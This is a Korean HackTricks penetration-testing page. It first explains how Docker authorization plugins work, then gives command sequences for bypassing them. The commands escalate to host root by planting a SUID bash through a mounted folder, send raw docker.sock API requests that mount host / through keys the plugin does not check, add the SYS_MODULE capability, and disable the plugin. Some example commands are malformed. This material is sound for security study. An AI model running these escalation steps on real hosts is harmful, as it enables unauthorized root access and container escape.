{{#include ../../../banners/hacktricks-training.md}}

**Docker**의 기본 **권한 부여** 모델은 **모두 또는 없음**입니다. Docker 데몬에 접근할 수 있는 권한이 있는 사용자는 **모든** Docker 클라이언트 **명령**을 **실행**할 수 있습니다. Docker의 Engine API를 사용하여 데몬에 연락하는 호출자에게도 동일하게 적용됩니다. **더 큰 접근 제어**가 필요한 경우, **권한 부여 플러그인**을 생성하고 이를 Docker 데몬 구성에 추가할 수 있습니다. 권한 부여 플러그인을 사용하면 Docker 관리자가 Docker 데몬에 대한 접근을 관리하기 위한 **세분화된 접근** 정책을 **구성**할 수 있습니다.

# 기본 아키텍처

Docker Auth 플러그인은 **외부** **플러그인**으로, 요청된 **작업**을 **허용/거부**할 수 있습니다. 이는 요청한 **사용자**와 요청된 **작업**에 따라 달라집니다.

**[다음 정보는 문서에서 가져온 것입니다](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

**HTTP** **요청**이 CLI를 통해 또는 Engine API를 통해 Docker **데몬**에 전달되면, **인증** **하위 시스템**이 설치된 **인증** **플러그인**(들)에게 요청을 전달합니다. 요청에는 사용자(호출자)와 명령 컨텍스트가 포함됩니다. **플러그인**은 요청을 **허용**할지 **거부**할지를 결정하는 책임이 있습니다.

아래의 시퀀스 다이어그램은 허용 및 거부 권한 부여 흐름을 나타냅니다:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)

플러그인에 전송된 각 요청은 **인증된 사용자, HTTP 헤더 및 요청/응답 본문**을 포함합니다. **사용자 이름**과 **사용된 인증 방법**만 플러그인에 전달됩니다. 가장 중요한 것은 **사용자 자격 증명**이나 토큰이 전달되지 않는다는 것입니다. 마지막으로, **모든 요청/응답 본문이** 권한 부여 플러그인에 전송되는 것은 아닙니다. `Content-Type`이 `text/*` 또는 `application/json`인 요청/응답 본문만 전송됩니다.

HTTP 연결을 잠재적으로 탈취할 수 있는 명령(`HTTP Upgrade`), 예를 들어 `exec`와 같은 경우, 권한 부여 플러그인은 초기 HTTP 요청에 대해서만 호출됩니다. 플러그인이 명령을 승인하면 나머지 흐름에는 권한 부여가 적용되지 않습니다. 특히, 스트리밍 데이터는 권한 부여 플러그인에 전달되지 않습니다. 청크된 HTTP 응답을 반환하는 명령, 예를 들어 `logs` 및 `events`와 같은 경우, HTTP 요청만 권한 부여 플러그인에 전송됩니다.

요청/응답 처리 중 일부 권한 부여 흐름은 Docker 데몬에 추가 쿼리를 수행해야 할 수 있습니다. 이러한 흐름을 완료하기 위해 플러그인은 일반 사용자와 유사하게 데몬 API를 호출할 수 있습니다. 이러한 추가 쿼리를 활성화하려면 플러그인이 관리자가 적절한 인증 및 보안 정책을 구성할 수 있는 수단을 제공해야 합니다.

## 여러 플러그인

Docker 데몬 **시작**의 일환으로 **플러그인**을 **등록**하는 것은 귀하의 책임입니다. **여러 플러그인을 설치하고 함께 연결**할 수 있습니다. 이 체인은 순서가 있을 수 있습니다. 데몬에 대한 각 요청은 순서대로 체인을 통과합니다. **모든 플러그인이 리소스에 대한 접근을 허용**할 때만 접근이 허용됩니다.

# 플러그인 예제

## Twistlock AuthZ Broker

플러그인 [**authz**](https://github.com/twistlock/authz)는 요청을 승인하기 위해 **플러그인**이 **읽을** **JSON** 파일을 생성할 수 있게 해줍니다. 따라서 각 사용자가 어떤 API 엔드포인트에 접근할 수 있는지를 매우 쉽게 제어할 수 있는 기회를 제공합니다.

다음은 Alice와 Bob이 새로운 컨테이너를 생성할 수 있도록 허용하는 예입니다: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

페이지 [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go)에서 요청된 URL과 작업 간의 관계를 찾을 수 있습니다. 페이지 [types.go](https://github.com/twistlock/authz/blob/master/core/types.go)에서 작업 이름과 작업 간의 관계를 찾을 수 있습니다.

## 간단한 플러그인 튜토리얼

설치 및 디버깅에 대한 자세한 정보가 포함된 **이해하기 쉬운 플러그인**을 여기에서 찾을 수 있습니다: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

`README` 및 `plugin.go` 코드를 읽어 작동 방식을 이해하세요.

# Docker Auth Plugin 우회

## 접근 열거

확인해야 할 주요 사항은 **어떤 엔드포인트가 허용되는지**와 **어떤 HostConfig 값이 허용되는지**입니다.

이 열거를 수행하기 위해 **도구** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**를 사용할 수 있습니다.**

## 허용되지 않는 `run --privileged`

### 최소 권한
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### 컨테이너 실행 후 특권 세션 얻기

이 경우 시스템 관리자는 **사용자가 볼륨을 마운트하고 `--privileged` 플래그로 컨테이너를 실행하는 것을 금지**하거나 컨테이너에 추가 권한을 부여하는 것을 금지했습니다:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
그러나 사용자는 **실행 중인 컨테이너 내에서 셸을 생성하고 추가 권한을 부여할 수 있습니다**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
이제 사용자는 [**이전에 논의된 기술**](#privileged-flag)을 사용하여 컨테이너에서 탈출하고 **호스트 내에서 권한을 상승**시킬 수 있습니다.

## 쓰기 가능한 폴더 마운트

이 경우 시스템 관리자는 **사용자가 `--privileged` 플래그로 컨테이너를 실행하는 것을 금지**하거나 컨테이너에 추가 권한을 부여하지 않았으며, `/tmp` 폴더만 마운트하는 것을 허용했습니다.
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
> [!NOTE]
> `/tmp` 폴더를 마운트할 수 없을 수도 있지만, **다른 쓰기 가능한 폴더**를 마운트할 수 있습니다. 쓰기 가능한 디렉토리는 다음을 사용하여 찾을 수 있습니다: `find / -writable -type d 2>/dev/null`
>
> **리눅스 머신의 모든 디렉토리가 suid 비트를 지원하는 것은 아닙니다!** suid 비트를 지원하는 디렉토리를 확인하려면 `mount | grep -v "nosuid"`를 실행하세요. 예를 들어, 일반적으로 `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` 및 `/var/lib/lxcfs`는 suid 비트를 지원하지 않습니다.
>
> 또한 **`/etc`** 또는 **구성 파일이 포함된** 다른 폴더를 **마운트할 수 있다면**, 도커 컨테이너에서 루트로 변경하여 **호스트에서 악용하고** 권한을 상승시킬 수 있습니다 (예: `/etc/shadow` 수정).

## Unchecked API Endpoint

이 플러그인을 구성하는 시스템 관리자의 책임은 각 사용자가 수행할 수 있는 작업과 권한을 제어하는 것입니다. 따라서 관리자가 엔드포인트와 속성에 대해 **블랙리스트** 접근 방식을 취하면, 공격자가 **권한을 상승시킬 수 있는** 일부를 **잊어버릴 수 있습니다.**

도커 API를 확인할 수 있습니다: [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Unchecked JSON Structure

### Binds in root

시스템 관리자가 도커 방화벽을 구성할 때 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)의 "**Binds**"와 같은 **중요한 매개변수를 잊어버렸을 가능성이 있습니다.**\
다음 예제에서는 이 잘못된 구성을 악용하여 호스트의 루트 (/) 폴더를 마운트하는 컨테이너를 생성하고 실행할 수 있습니다:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
> [!WARNING]
> 이 예제에서 **`Binds`** 매개변수를 JSON의 루트 수준 키로 사용하고 있지만 API에서는 **`HostConfig`** 키 아래에 나타나는 것을 주목하세요.

### HostConfig의 Binds

**루트의 Binds**와 동일한 지침을 따라 Docker API에 이 **요청**을 수행하세요:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

**Binds in root**와 동일한 지침을 따르며 Docker API에 이 **요청**을 수행합니다:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

**Binds in root**와 동일한 지침을 따르며, Docker API에 이 **요청**을 수행합니다:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

시스템 관리자가 도커 방화벽을 구성할 때 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)의 "**HostConfig**" 내의 "**Capabilities**"와 같은 **매개변수의 중요한 속성을 잊었을 가능성이 있습니다**. 다음 예제에서는 이 잘못된 구성을 악용하여 **SYS_MODULE** 권한을 가진 컨테이너를 생성하고 실행할 수 있습니다:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
> [!NOTE]
> **`HostConfig`**는 일반적으로 컨테이너에서 탈출하기 위한 **흥미로운** **권한**을 포함하는 키입니다. 그러나 이전에 논의한 바와 같이, 그 외부에서 Binds를 사용하는 것도 작동하며 제한을 우회할 수 있습니다.

## 플러그인 비활성화

**sysadmin**이 **플러그인**을 **비활성화**할 수 있는 능력을 **금지하는 것을 잊었다면**, 이를 이용하여 완전히 비활성화할 수 있습니다!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
플러그인을 **승격 후 다시 활성화하는 것을 잊지 마세요**, 그렇지 않으면 **docker 서비스의 재시작이 작동하지 않습니다**!

## Auth Plugin Bypass writeups

- [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{{#include ../../../banners/hacktricks-training.md}}
